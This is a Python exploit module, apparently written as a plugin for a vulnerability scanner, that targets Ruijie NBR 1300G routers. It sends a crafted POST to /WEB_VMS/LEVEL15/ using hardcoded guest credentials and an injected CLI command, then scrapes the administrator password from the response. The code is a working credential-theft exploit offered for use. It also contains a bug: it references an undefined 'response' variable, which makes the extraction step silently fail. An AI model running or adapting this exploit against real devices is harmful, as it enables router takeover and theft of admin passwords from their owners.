#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re

def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/锐捷/锐捷 NBR 1300G路由器 越权CLI命令执行漏洞.html',

      'huixian'   :  '',

      'method'    :  'post',

      'bugname'   :  '锐捷 NBR 1300G路由器 越权CLI命令执行漏洞',

      'level'     :  'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      "Content-Type": "application/x-www-form-urlencoded",
      "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
      }
  data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.'
  target = "/WEB_VMS/LEVEL15/"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200 and "webmaster" in res.text and "password" in res.text:
      user_data = re.findall(r'webmaster level 0 username admin password (.*?)<OPTION>', response.text)[0]
      ret['huixian'] = '管理员账号密码为：admin/{}'.format(user_data)
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret